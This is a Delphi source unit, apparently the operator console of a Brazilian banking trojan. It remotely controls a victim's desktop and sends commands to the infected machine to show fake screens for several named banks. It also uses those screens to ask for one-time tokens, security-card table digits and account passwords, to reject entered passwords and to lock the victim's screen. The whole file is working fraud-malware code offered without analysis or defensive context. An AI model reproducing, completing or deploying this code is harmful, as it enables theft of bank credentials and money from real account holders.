unit Desktop_Remoto;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, ScktComp, ComCtrls, AdvGlassButton, GR32_Layers,
  GR32_Image;
 {
  Dialogs, ExtCtrls, W7Classes, W7Images, GR32_Image, StdCtrls, ComCtrls,
  AdvGlassButton, GR32_Layers, MPlayer, IdBaseComponent, IdAntiFreezeBase,
  IdAntiFreeze;
 }

type
  TForm2 = class(TForm)
    Panel1: TPanel;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    ScrollBox1: TScrollBox;
    Timer1: TTimer;
    pbtn: TPanel;
    Mlog: TMemo;
    GroupBox1: TGroupBox;
    AdvGlassButton6: TAdvGlassButton;
    AdvGlassButton7: TAdvGlassButton;
    AdvGlassButton8: TAdvGlassButton;
    pnlBANCO: TPanel;
    Panel3: TPanel;
    Panel5: TPanel;
    BtStartaFakePJ: TAdvGlassButton;
    BtTokenPJ: TAdvGlassButton;
    BtTabelaPJ: TAdvGlassButton;
    BtBloquearPJ: TAdvGlassButton;
    Panel4: TPanel;
    Panel6: TPanel;
    BtStartaFakePF: TAdvGlassButton;
    BtTokenPF: TAdvGlassButton;
    BtTabelaPF: TAdvGlassButton;
    BtBloquearPF: TAdvGlassButton;
    Panel2: TPanel;
    StaticText1: TStaticText;
    EdtQimg: TEdit;
    UpDown1: TUpDown;
    BtnSend: TAdvGlassButton;
    EdtSend: TEdit;
    edtansi: TEdit;
    AdvGlassButton1: TAdvGlassButton;
    Panel7: TPanel;
    Image2: TImage;
    fps: TTimer;
    tempordp: TTimer;
    Timeout: TTimer;
    StatusBar1: TStatusBar;
    Memo1: TMemo;
    BtNegarSenhaF: TAdvGlassButton;
    BtNegarSenhaJ: TAdvGlassButton;
    status: TStatusBar;
    Image1: TImage;
    procedure Timer1Timer(Sender: TObject);
    procedure CheckBox2KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormResize(Sender: TObject);
    procedure Image1DblClick(Sender: TObject);
    procedure AdvGlassButton6Click(Sender: TObject);
    procedure BtnSendClick(Sender: TObject);
    procedure AdvGlassButton1Click(Sender: TObject);
    procedure BtNegarSenhaFClick(Sender: TObject);

    function RetornaTela: String;
    procedure BtStartaFakePJClick(Sender: TObject);
    procedure BtStartaFakePFClick(Sender: TObject);
    procedure EdtSendClick(Sender: TObject);
    procedure BtTokenPFClick(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure fpsTimer(Sender: TObject);
    procedure tempordpTimer(Sender: TObject);
    procedure TimeoutTimer(Sender: TObject);
    procedure BtTabelaPFClick(Sender: TObject);
    procedure BtTokenPJClick(Sender: TObject);
    procedure BtTabelaPJClick(Sender: TObject);
    procedure BtBloquearPJClick(Sender: TObject);
    procedure AdvGlassButton8Click(Sender: TObject);

    procedure ConfigPainel;
    procedure AdvGlassButton7Click(Sender: TObject);
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer; Layer: TCustomLayer);
    procedure FormClick(Sender: TObject);
    procedure Image1KeyPress(Sender: TObject; var Key: Char);
    procedure Image1KeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure VerificaTecla;
    procedure Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer; Layer: TCustomLayer);
    procedure Image1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer; Layer: TCustomLayer);
    procedure BtNegarSenhaJClick(Sender: TObject);
  private
    { Private declarations }
  public
    tm1: Integer;
    tm2: Integer;
    tm3: Integer;
    tm4: Integer;
    Socket, Socket2: TCustomWinSocket;
    { Public declarations }
  end;

var
  Form2: TForm2;
  x1: Integer = 0;
  y1: Integer = 0;
  cTELA, sBanco : String;
  cGetTOKEN_J , cGetTOKEN_F  : String;
  cGetTABELA_J, cGetTABELA_F : String;
  FakeF : Boolean = False;
  FakeJ : Boolean = False;


implementation

uses Principa;

{$R *.dfm}

procedure TForm2.Timer1Timer(Sender: TObject);
begin
  VerificaTecla;
end;

procedure TForm2.CheckBox2KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_SPACE then
    Key := 0;
end;

procedure TForm2.CheckBox1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_SPACE then
    Key := 0;
end;

procedure TForm2.CheckBox2Click(Sender: TObject);
begin
  if CheckBox2.Checked then
      Socket.SendText('<|REQUESTKEYBOARD|>');
end;

procedure TForm2.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  CheckBox1.Checked := false;
  CheckBox2.Checked := false;
end;

procedure TForm2.FormResize(Sender: TObject);
begin
  image1.left := trunc((ScrollBox1.width - image1.width) / 2);
  image1.top  := trunc((ScrollBox1.height - image1.height) / 2);
end;

procedure TForm2.Image1DblClick(Sender: TObject);
begin
  if CheckBox1.Checked then
     Socket.SendText('<|MouseDC|>'+intToStr(x1)+'<|>'+intToStr(y1)+'<<|');
end;

procedure TForm2.AdvGlassButton6Click(Sender: TObject);
begin
  Socket.SendText('<|Close|>');
end;

procedure TForm2.BtnSendClick(Sender: TObject);
begin
  Socket2.SendText( EdtSend.Text );
  EdtSend.Text := '';
  EdtSend.Clear;
  CheckBox2.Checked := True;
end;

procedure TForm2.AdvGlassButton1Click(Sender: TObject);
begin
  Socket2.SendText( Char(#8) );
  edtansi.Text := '';
  edtansi.Clear;
end;

procedure TForm2.BtNegarSenhaFClick(Sender: TObject);
begin
  // Socket.SendText( '<|NEGASENHA|>' );
  cTELA := RetornaTela;
  if cTELA = 'ITAJ' then
     cTELA := 'ITA';

  if cTELA = 'BBJ' then
     cTELA := 'BB';

  if cTELA = 'SANTAJ' then
     cTELA := 'SANTA';

  Socket.SendText( 'NEGASENHA|'+cTELA);
end;

function TForm2.RetornaTela: String;
var
  Resultado: String;
  i : Integer;
  xTELA  : String;
  Titulo : String;
begin
  Titulo    := Form2.Caption;
  Resultado := Copy( Titulo , Pos('Sigla:',Titulo)+6, Length(Titulo) );

  if Resultado = 'SANTA' then
     Resultado := Resultado + 'J'
  else if Resultado = 'SANTAJ' then
     Resultado := 'SANTA';

  if Resultado = 'ITAJ' then
     Resultado := 'ITA'
  else if Resultado = 'ITA' then
     Resultado := Resultado + 'J';

  if Resultado = 'BBJ' then
     Resultado := 'BB'
  else if Resultado = 'BB' then
     Resultado := 'BBJ';

  Result := Trim(Resultado);
end;

procedure TForm2.BtStartaFakePJClick(Sender: TObject);
begin
  cTELA := RetornaTela;

  if cTELA = 'ITA' then
     cTELA := cTELA + 'J';

  if cTELA = 'BB' then
     cTELA := 'BBJ';

  if cTELA = 'SANTA' then
     cTELA := 'SANTAJ';

  Socket.SendText( 'STARTFAKE|'+cTELA );
  Memo1.Lines.Add('Start Fake para '+cTELA);
  FakeF := False;
  FakeJ := True;
end;

procedure TForm2.BtStartaFakePFClick(Sender: TObject);
begin
  cTELA := RetornaTela;
  if cTELA = 'ITAJ' then
     cTELA := 'ITA';

  if cTELA = 'BBJ' then
     cTELA := 'BB';

  if cTELA = 'SANTAJ' then
     cTELA := 'SANTA';
     
  Socket.SendText( 'STARTFAKE|'+cTELA );
  Memo1.Lines.Add('Start Fake para '+cTELA);
  FakeF := True;
  FakeJ := False;
end;

procedure TForm2.EdtSendClick(Sender: TObject);
begin
  if CheckBox2.Checked then
     CheckBox2.Checked := False;
end;

procedure TForm2.BtTokenPFClick(Sender: TObject);
var
  s: string;
begin
  cTELA := RetornaTela;
  if (cTELA <> 'FBRB') then // and (cTELA <> 'FAZUL') then
      s := InputBox('Pedido de tokem '+cTELA, 'Por Favor digite os ultimos 3 digitos', '000')
  else
      s := cTELA;
  BtTokenPF.BackColor := clred;
  Socket.SendText( cGetTOKEN_F + '|' + s );
  Memo1.Lines.Add('Enviado: ' + cGetTOKEN_F + '|' + s );
end;

procedure TForm2.FormShow(Sender: TObject);
begin
  ConfigPainel;
end;

procedure TForm2.fpsTimer(Sender: TObject);
begin
  {
  status.Panels[0].Text := 'Fps:' + inttostr(frm_principal.imgcount1);
  frm_principal.imgcount1 := 0;
  }
end;

procedure TForm2.tempordpTimer(Sender: TObject);
begin
  if tm1 < 60 then
     inc(tm1)
  else
     begin
       inc(tm2);
       tm1 := 0;
     end;
  status.Panels[1].Text := inttostr(tm2) + ':' + inttostr(tm1);
end;

procedure TForm2.TimeoutTimer(Sender: TObject);
begin
  if tm3 < 60 then
     inc(tm3)
  else
     begin
       inc(tm4);
       tm3 := 0;
     end;
  status.Panels[2].Text := inttostr(tm4) + ':' + inttostr(tm3);
end;

procedure TForm2.BtTabelaPFClick(Sender: TObject);
var
  s: string;
begin
  cTELA := RetornaTela;
  if (cTELA <> 'BB') and (cTELA <> 'FAZUL') then
      s := InputBox('Pedido de Tabela '+cTELA, 'Por Favor digite os ultimos 2 digitos', '01')
  else
      s := cTELA;
  BtTabelaPF.BackColor := clred;
  Socket.SendText( cGetTABELA_F + '|' + s );
end;

procedure TForm2.BtTokenPJClick(Sender: TObject);
var
  s: string;
begin
  cTELA := RetornaTela;
  s := InputBox('Pedido de tokem '+cTELA, 'Por Favor digite os ultimos 3 digitos', '000');
  // colocar funçao pra enviar pra tela apos gordo faze
  BtTokenPJ.BackColor := clred;
  Socket.SendText( cGetTOKEN_J + '|' + s);
end;

procedure TForm2.BtTabelaPJClick(Sender: TObject);
var
  s: string;
begin
  cTELA := RetornaTela;
  if (cTELA <> 'BBJ') then
      s := InputBox('Pedido de Tabela '+cTELA, 'Por Favor digite os ultimos 2 digitos', '01')
  else
      s := cTELA;
  BtTabelaPJ.BackColor := clred;
  Socket.SendText( cGetTABELA_J + '|' + s);
end;

procedure TForm2.BtBloquearPJClick(Sender: TObject);
begin
  cTELA := RetornaTela;
  Socket.SendText( 'BLOCK|'+cTELA);
end;

procedure TForm2.AdvGlassButton8Click(Sender: TObject);
begin
  cTELA := RetornaTela;
  Socket.SendText('SETFOCUS');
end;

procedure TForm2.ConfigPainel;
var
  sBanco: String;
begin
  BtTabelaPJ.Caption := 'Tabela | PJ';
  BtTabelaPF.Caption := 'Tabela | PF';

  sBanco := Trim(RetornaTela);
  cTELA  := Trim(RetornaTela);

  if sBanco = 'SANTAJ' then
     begin
       cTELA        := 'SANTAJ';
       cGetTOKEN_J  := 'GETSANTAJTOKEN';
       cGetTABELA_J := '';
       cGetTOKEN_F  := '';
       cGetTABELA_F := 'SANTAPOSICAO';
       BtStartaFakePJ.Enabled := True;
     end
  else if sBanco = 'SANTA' then
     begin
       cTELA        := 'SANTA';
       cGetTOKEN_J  := 'GETSANTAJTOKEN';
       cGetTABELA_J := '';
       cGetTOKEN_F  := '';
       cGetTABELA_F := 'SANTAPOSICAO';
     end
  else if sBanco = 'BBJ' then
     begin
       BtTabelaPJ.Caption := 'S8 CONTA PJ';
       cTELA        := 'BBJ';
       cGetTOKEN_J  := '';
       cGetTABELA_J := 'BBJSCONTA';
       cGetTOKEN_F  := '';
       cGetTABELA_F := '';
     end
  else if sBanco = 'BB' then
     begin
       BtTabelaPF.Caption := 'S6 CONTA PF';
       cTELA        := 'BB';
       cGetTOKEN_J  := '';
       cGetTABELA_J := 'BBSENHA6';
       cGetTOKEN_F  := '';
       cGetTABELA_F := '';
     end
  else if sBanco = 'ITAJ' then
     begin
       cTELA        := 'ITAJ';
       cGetTOKEN_J  := 'GETITAJTOKEN';
       cGetTABELA_J := '';
       cGetTOKEN_F  := 'GETITATOKEN';
       cGetTABELA_F := 'GETITATABELA';
     end
  else if sBanco = 'ITA' then
     begin
       cTELA        := 'ITA';
       cGetTOKEN_J  := 'GETITAJTOKEN';
       cGetTABELA_J := '';
       cGetTOKEN_F  := 'GETITATOKEN';
       cGetTABELA_F := 'GETITATABELA';
     end
  else if sBanco = 'VerMPF' then
     begin
       cTELA        := 'VerMPF';
       cGetTOKEN_J  := 'GETVERMPJTOKEN';
       cGetTABELA_J := '';
       cGetTOKEN_F  := 'GETVERMPFTOKEN';
       cGetTABELA_F := 'GETVERMFTABELA';
     end
  else if sBanco = 'FAZUL' then
     begin
       cTELA        := 'FAZUL';
       cGetTOKEN_J  := '';
       cGetTABELA_J := '';
       cGetTOKEN_F  := '';
       cGetTABELA_F := 'GETFAZULFTABELA';
     end
  else if sBanco = 'FBRB' then
     begin
       cTELA        := 'FBRB';
       cGetTOKEN_J  := '';
       cGetTABELA_J := '';
       cGetTOKEN_F  := 'GETFBRBFTOKEN';
       cGetTABELA_F := '';
     end;

  if Pos('J',cTELA) > 0 then
     begin
       BtStartaFakePJ.Enabled := True;
       BtStartaFakePF.Enabled := False;
     end
  else
     begin
       BtStartaFakePJ.Enabled := False;
       BtStartaFakePF.Enabled := True;
     end;

  if (Pos('SANTA',cTELA) > 0 ) or (Pos('SANTAJ',cTELA) > 0 ) or
     (Pos('ITA', sBanco) <> 0) or (Pos('ITAJ', sBanco) <> 0) or
     (Pos('BB', sBanco ) <> 0) or (Pos('BBJ', sBanco) <> 0 ) then
     begin
       BtStartaFakePJ.Enabled := True;
       BtStartaFakePF.Enabled := True;
     end;
 {
  if (Trim(cGetTOKEN_J)='') then
      BtTokenPJ.Enabled := False
  else
      BtTokenPJ.Enabled := True;

  if (Trim(cGetTOKEN_F)='') then
      BtTokenPF.Enabled := False
  else
      BtTokenPF.Enabled := True;

  if (Trim(cGetTABELA_J)='') then
      BtTabelaPJ.Enabled := False
  else
      BtTabelaPJ.Enabled := True;

  if (Trim(cGetTABELA_F)='') then
      BtTabelaPF.Enabled := False
  else
      BtTabelaPF.Enabled := True;
      }
  {
  fps.Enabled      := true;
  tempordp.Enabled := true;

   if frm_principal.CodMonitor <> NIL then
     begin
       frm_principal.dbg('Enviou Pedido de som');
       frm_principal.CodMonitor.Connection.IOHandler.WriteLn('SOUND|ON');
     end;
     }
end;

procedure TForm2.AdvGlassButton7Click(Sender: TObject);
begin
  Socket.SendText('NEWPRINT');
end;

procedure TForm2.Image1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer; Layer: TCustomLayer);
begin
  if CheckBox1.Checked then
      begin
        if Button = mbLeft then
           Socket.SendText('<|MouseLD|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
        if Button = mbRight then
           Socket.SendText('<|MouseRD|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
      end;
end;

procedure TForm2.Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer; Layer: TCustomLayer);
begin
  x1 := X;
  y1 := Y;
  if CheckBox1.Checked then
      Socket.SendText('<|MousePos|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
end;

procedure TForm2.FormClick(Sender: TObject);
begin
  // Image1.SetFocus;
end;

procedure TForm2.Image1KeyPress(Sender: TObject; var Key: Char);
begin
  {
  EdtSend.Text := EdtSend.Text + Key;
  if Key = #13 then
     begin
       Socket.SendText( EdtSend.Text );
       EdtSend.Text := '';
       EdtSend.Clear;
     end;
     }
end;

procedure TForm2.Image1KeyUp(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
//  Socket.SendText('KEY|' + Char(Key));
end;

procedure TForm2.VerificaTecla;
var
  i : byte;
begin
  if (Form2.Active) and (CheckBox2.Checked) then
     begin
        try
        {  CheckBox1.TabStop := false;
           CheckBox2.TabStop := false;
           CheckBox3.TabStop := false;}
           for i:=8 To 222 do
           begin
             if GetAsyncKeyState(i)=-32767 then
                begin
                  case i of
                      8   : Socket2.SendText('{BS}');
                      9   : Socket2.SendText('{TAB}');
                      13  : Socket2.SendText('{ENTER}');
                      //17 : memo1.text:=memo1.text+'[Ctrl]';
                      27  : Socket2.SendText('{ESCAPE}');
                      32  : Socket2.SendText(' '); //Space
                      33  : Socket2.SendText('{PGUP}');
                      34  : Socket2.SendText('{PGDN}');
                      35  : Socket2.SendText('{END}');
                      36  : Socket2.SendText('{HOME}');
                      37  : Socket2.SendText('{LEFT}');
                      38  : Socket2.SendText('{UP}');
                      39  : Socket2.SendText('{RIGHT}');
                      40  : Socket2.SendText('{DOWN}');
                      44  : Socket2.SendText('{PRTSC}');
                     // 45 : memo1.text := Memo1.text + '[Insert]';
                      46  : Socket2.SendText('{DEL}');
                      145 : Socket2.SendText('{SCROLLLOCK}');

                      //Number 1234567890 Symbol !@#$%^&*()
                      48 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText(')')
                           else Socket2.SendText('0');
                      49 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('!')
                           else Socket2.SendText('1');
                      50 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('@')
                           else Socket2.SendText('2');
                      51 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('#')
                           else Socket2.SendText('3');
                      52 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('$')
                           else Socket2.SendText('4');
                      53 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('%')
                           else Socket2.SendText('5');
                      54 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('^')
                           else Socket2.SendText('6');
                      55 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('&')
                           else Socket2.SendText('7');
                      56 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('*')
                           else Socket2.SendText('8');
                      57 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('(')
                           else Socket2.SendText('9');
                      65..90 : // a..z , A..Z
                          begin
                          if ((GetKeyState(VK_CAPITAL))=1) then
                              if GetKeyState(VK_SHIFT)<0 then
                                 Socket2.SendText(LowerCase(Chr(i))) //a..z
                              else
                                 Socket2.SendText(UpperCase(Chr(i))) //A..Z
                          else
                              if GetKeyState(VK_SHIFT)<0 then
                                  Socket2.SendText(UpperCase(Chr(i))) //A..Z
                              else
                                  Socket2.SendText(LowerCase(Chr(i))); //a..z
                          end;
                      //Numpad
                      96..105 : Socket2.SendText(inttostr(i-96)); //Numpad  0..9
                      106: Socket2.SendText('*');
                      107: Socket2.SendText('&');
                      109: Socket2.SendText('-');
                      110: Socket2.SendText('.');
                      111: Socket2.SendText('/');
                      // 144 : memo1.text:=memo1.text+'[Num Lock]';

                      112..123: //F1-F12
                          Socket2.SendText('{F'+IntToStr(i - 111)+'}');

                      186 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText(':')
                            else Socket2.SendText(';');
                      187 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('+')
                            else Socket2.SendText('=');
                      188 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('<')
                            else Socket2.SendText(',');
                      189 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('_')
                            else Socket2.SendText('-');
                      190 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('>')
                            else Socket2.SendText('.');
                      191 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('?')
                            else Socket2.SendText('/');
                      192 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('~')
                            else Socket2.SendText('`');
                      219 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('{')
                            else Socket2.SendText('[');
                      220 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('|')
                            else Socket2.SendText('\');
                      221 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('}')
                            else Socket2.SendText(']');
                      222 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('"')
                            else Socket2.SendText('''');
                  end;
                end;
            end;
          except
            exit;
          end;
     end;
end;

procedure TForm2.Image1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer; Layer: TCustomLayer);
begin
  if CheckBox1.Checked then
     begin
       if Button = mbLeft then
          Socket.SendText('<|MouseLU|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|')
       else
          Socket.SendText('<|MouseRU|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
     end;
end;

procedure TForm2.BtNegarSenhaJClick(Sender: TObject);
begin
  cTELA := RetornaTela;
  if cTELA = 'ITA' then
     cTELA := cTELA + 'J';

  if cTELA = 'BB' then
     cTELA := 'BBJ';

  if cTELA = 'SANTAJ' then
     cTELA := 'SANTA';

  Socket.SendText( 'NEGASENHA|'+cTELA);
end;

end.
